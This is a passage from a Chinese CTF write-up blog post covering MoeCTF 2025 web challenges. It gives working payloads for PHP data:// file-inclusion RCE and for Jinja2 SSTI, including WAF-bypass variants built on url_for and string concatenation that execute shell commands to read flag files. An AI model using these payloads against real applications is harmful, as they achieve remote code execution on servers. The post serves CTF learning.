+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php%20system(&#x27;cat /fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即得 flag 了</p>
+<p><img src="/img/FJFEb4x7KoF8PHxCFJ3cXeqPnXf.png"></p>
+<h3 id="做题启示-3"><a href="#做题启示-3" class="headerlink" title="做题启示"></a>做题启示</h3><p>遇到非死亡拼接题，考虑一下题目是否有非常特殊的环境，以至于 data 协议有效</p>
+<h2 id="问题-15-基础-SSTI-第二十章-幽冥血海·幻语心魔"><a href="#问题-15-基础-SSTI-第二十章-幽冥血海·幻语心魔" class="headerlink" title="[问题 15&#x2F;基础 SSTI]第二十章 幽冥血海·幻语心魔"></a>[问题 15&#x2F;基础 SSTI]第二十章 幽冥血海·幻语心魔</h2><p>很简单的 SSTI 注入，略过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /fl*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/VhzVbbvC2ooSnIxuCplcKdKbnL7.png"></p>
+<h2 id="问题-16-url-forSSTI-二刷-第二十一章-往生漩涡·言灵死局"><a href="#问题-16-url-forSSTI-二刷-第二十一章-往生漩涡·言灵死局" class="headerlink" title="[问题 16&#x2F;url_forSSTI]二刷_第二十一章 往生漩涡·言灵死局"></a>[问题 16&#x2F;url_forSSTI]二刷_第二十一章 往生漩涡·言灵死局</h2><p>有过滤的 SSTI，我们二刷一遍分析</p>
+<p>输入49，报错了</p>
+<p><img src="/img/WOoybtA04owfdPxgTUvcVmLfnDf.png"></p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(7*7)%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功通过</p>
+<p>使用 os 模块，有 WAF</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(config.__class__.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/T11tbMl9foYUm9xAV4Nctb9snQg.png"></p>
+<p>输入双下划线，发现双下划线被过滤</p>
+<p>config 无效，我们可以用 url_for</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_glo&#x27;</span>+<span class="string">&#x27;bals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /fl*&#x27;</span>).<span class="built_in">read</span>())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Iy5Ybtt9Ro9MYDxHt9Cciindnfg.png"></p>
+<h3 id="做题启示-4"><a href="#做题启示-4" class="headerlink" title="做题启示"></a>做题启示</h3><p>下面这两个，经测试也是合理正确的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_glo&#x27;</span>+<span class="string">&#x27;bals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_getitem_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /fl*&#x27;</span>).<span class="built_in">read</span>())%&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_glo&#x27;</span>+<span class="string">&#x27;bals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;get&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /fl*&#x27;</span>).<span class="built_in">read</span>())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但形如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_glo&#x27;</span>+<span class="string">&#x27;bals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]|attr(<span class="string">&#x27;get&#x27;</span>)(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /fl*&#x27;</span>).<span class="built_in">read</span>())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是不正确的，attr 尽量不要和中括号混用</p>
+<h2 id="问题-17-无回显-SSTI-SUID-提权-第二十二章"><a href="#问题-17-无回显-SSTI-SUID-提权-第二十二章" class="headerlink" title="[问题 17&#x2F;无回显 SSTI&#x2F;SUID 提权]第二十二章"></a>[问题 17&#x2F;无回显 SSTI&#x2F;SUID 提权]第二十二章</h2><p><a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/M10mwEklRiLZdDkkptMcqCPcnQf?from=from_copylink">扶摇 · 二 SSTI 拓展和 SUID 提权</a></p>
+<h2 id="问题-18-java-反序列化-第二十三章-幻境迷心·皇陨星沉-大结局"><a href="#问题-18-java-反序列化-第二十三章-幻境迷心·皇陨星沉-大结局" class="headerlink" title="[问题 18&#x2F;java 反序列化]第二十三章 幻境迷心·皇陨星沉(大结局)"></a>[问题 18&#x2F;java 反序列化]第二十三章 幻境迷心·皇陨星沉(大结局)</h2><p>等待未来学习</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://hnu-legend1440.com">legend1440</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://hnu-legend1440.com/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/">http://hnu-legend1440.com/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://hnu-legend1440.com" target="_blank">拂云观 · legend1440</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/png040404.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/04/%E6%89%B6%E6%91%87%C2%B7%E4%B8%83-nikto%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8EPUT%E4%BC%A0%E9%A9%AC/" title="扶摇·七--nikto的使用与PUT传马"><img class="cover" src="/img/png040402.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">扶摇·七--nikto的使用与PUT传马</div></div><div class="info-2"><div class="info-item-1">在题目中，我们会遇到网页开放 PUT 方法，这可能允许 PUT 上传木马，从而用这种方式 getshell 那么我们如何判断该方法是否可行，实战中又如何操作呢？本章将围绕这一话题叙述。 nikto 工具简介Nikto2 是一款开源的、功能强大的 Web 服务器扫描器。简单来说，它的核心作用就是自动、快速地对网站进行全面的安全检查，帮助发现潜在的安全隐患。 Nikto 的检查范围非常广泛，主要包括四大类问题：  危险文件与程序：扫描服务器上是否存在超过 7000 个已知的、可能被攻击者利用的危险文件或 CGI 程序（如测试脚本、后台管理页面等）。 服务器版本过时：检查超过 1250 种 Web 服务器的版本是否为过时版本，这些旧版本可能包含已知但未修复的安全漏洞。 特定版本漏洞：针对 270 多种服务器软件，查找其特定版本中存在的问题。 配置错误：检测服务器配置不当的地方，例如是否存在多个索引文件、是否开放了不安全的 HTTP 方法（如 PUT）、是否泄露了服务器信息等。  nikto 的使用这东西，它得在 linux 系统上才能正常运行，核心指令大概这么多，注意不要加 http ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://q.qlogo.cn/headimg_dl?dst_uin=1535548287&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">legend1440</div><div class="author-info-description">前进中的CTF-web现役队员</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" href="http://hnu-legend1440.com/2026/03/15/%E6%9D%A8%E6%A1%83%E7%9B%91%E7%8B%B1%C2%B7%E8%BF%9B%E6%9C%8D%E6%B5%81%E7%A8%8B%E6%8C%87%E5%BC%95/"><i class="fa fa-star"></i><span>杨桃监狱Minecraft服务器</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://www.hnusec.com/" target="_blank" title="HnuSec"><i class="far fa-star"></i></a><a class="social-icon" href="http://hnu-legend1440.com" target="_blank" title="1535548287"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://space.bilibili.com/652601966?spm_id_from=333.788.0.0" target="_blank" title="BiliBili"><i class="fa fa-play"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">平芜尽处是春山</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-1-F12-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="toc-text">[问题 1&#x2F;F12&#x2F;源码分析]第一章 神秘的手镯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-2-%E6%8A%93%E5%8C%85%E6%9F%A5%E5%93%8D%E5%BA%94%E5%A4%B4-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="toc-text">[问题 2&#x2F;抓包查响应头]第二章 初识金曦玄轨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-3-%E7%AE%80%E5%8D%95-http-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="toc-text">[问题 3&#x2F;简单 http]第三章 问剑石！篡天改命！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-4-PUT-%E8%84%9A%E6%9C%AC-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="toc-text">[问题 4&#x2F;PUT 脚本]第四章 金曦破禁与七绝傀儡阵</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-5-SQL-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="toc-text">[问题 5&#x2F;SQL 万能密码]第六章 藏经禁制？玄机初探！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-6-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-MD5-%E5%BC%B1%E6%AF%94%E8%BE%83-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="toc-text">[问题 6&#x2F;信息收集&#x2F;MD5 弱比较]第七章 灵蛛探穴与阴阳双生符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-7-%E5%8F%8C%E5%8F%98%E9%87%8F-SQL-%E6%B3%A8%E5%85%A5-sqlmap-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="toc-text">[问题 7&#x2F;双变量 SQL 注入&#x2F;sqlmap]第八章 天衍真言，星图显圣</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA"><span class="toc-text">做题启示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-8-RCE-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="toc-text">[问题 8&#x2F;RCE&#x2F;命令拼接]第九章 星墟禁制·天机问路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-9-Burp-%E7%88%86%E7%A0%B4-%E7%BC%96%E7%A0%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="toc-text">[问题 9&#x2F;Burp 爆破&#x2F;编码文件包含]第十一章 千机变·破妄之眼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-1"><span class="toc-text">做题启示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-10-%E8%9A%81%E5%89%91-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="toc-text">[问题 10&#x2F;蚁剑]第十二章 玉魄玄关·破妄</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">关于环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-11-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87%E5%A4%B4%E6%A3%80%E9%AA%8C-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="toc-text">[问题 11&#x2F;文件上传&#x2F;绕过头检验]第十三章 通幽关·灵纹诡影</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-2"><span class="toc-text">做题启示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-12-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-htaccess-%E9%97%AE%E9%A2%98-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="toc-text">[问题 12&#x2F;文件上传&#x2F;.htaccess 问题]第十四章 御神关·补天玉碑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-13-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E5%BD%92%E7%9C%9F%E5%85%B3%C2%B7%E7%AB%9E%E6%97%B6%E5%87%80%E9%AD%94"><span class="toc-text">[问题 13&#x2F;文件上传&#x2F;条件竞争]第十五章 归真关·竞时净魔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-14-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data-%E5%8D%8F%E8%AE%AE"><span class="toc-text">[问题 14&#x2F;文件包含 data 协议]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-3"><span class="toc-text">做题启示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-15-%E5%9F%BA%E7%A1%80-SSTI-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="toc-text">[问题 15&#x2F;基础 SSTI]第二十章 幽冥血海·幻语心魔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-16-url-forSSTI-%E4%BA%8C%E5%88%B7-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="toc-text">[问题 16&#x2F;url_forSSTI]二刷_第二十一章 往生漩涡·言灵死局</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-4"><span class="toc-text">做题启示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-17-%E6%97%A0%E5%9B%9E%E6%98%BE-SSTI-SUID-%E6%8F%90%E6%9D%83-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0"><span class="toc-text">[问题 17&#x2F;无回显 SSTI&#x2F;SUID 提权]第二十二章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-18-java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E7%AB%A0-%E5%B9%BB%E5%A2%83%E8%BF%B7%E5%BF%83%C2%B7%E7%9A%87%E9%99%A8%E6%98%9F%E6%B2%89-%E5%A4%A7%E7%BB%93%E5%B1%80"><span class="toc-text">[问题 18&#x2F;java 反序列化]第二十三章 幻境迷心·皇陨星沉(大结局)</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/" title="[赛题复现]MoeCTF-2025"><img src="/img/png040404.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[赛题复现]MoeCTF-2025"/></a><div class="content"><a class="title" href="/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/" title="[赛题复现]MoeCTF-2025">[赛题复现]MoeCTF-2025</a><time datetime="2026-04-04T12:07:02.000Z" title="发表于 2026-04-04 20:07:02">2026-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/04/%E6%89%B6%E6%91%87%C2%B7%E4%B8%83-nikto%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8EPUT%E4%BC%A0%E9%A9%AC/" title="扶摇·七--nikto的使用与PUT传马"><img src="/img/png040402.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="扶摇·七--nikto的使用与PUT传马"/></a><div class="content"><a class="title" href="/2026/04/04/%E6%89%B6%E6%91%87%C2%B7%E4%B8%83-nikto%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8EPUT%E4%BC%A0%E9%A9%AC/" title="扶摇·七--nikto的使用与PUT传马">扶摇·七--nikto的使用与PUT传马</a><time datetime="2026-04-04T11:00:00.000Z" title="发表于 2026-04-04 19:00:00">2026-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/03/%E6%89%B6%E6%91%87%C2%B7%E5%85%AD-python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%97%AE%E9%A2%98/" title="扶摇·六--python原型链污染问题"><img src="/img/jpg040403.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="扶摇·六--python原型链污染问题"/></a><div class="content"><a class="title" href="/2026/04/03/%E6%89%B6%E6%91%87%C2%B7%E5%85%AD-python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%97%AE%E9%A2%98/" title="扶摇·六--python原型链污染问题">扶摇·六--python原型链污染问题</a><time datetime="2026-04-03T15:00:00.000Z" title="发表于 2026-04-03 23:00:00">2026-04-03</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By legend1440</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
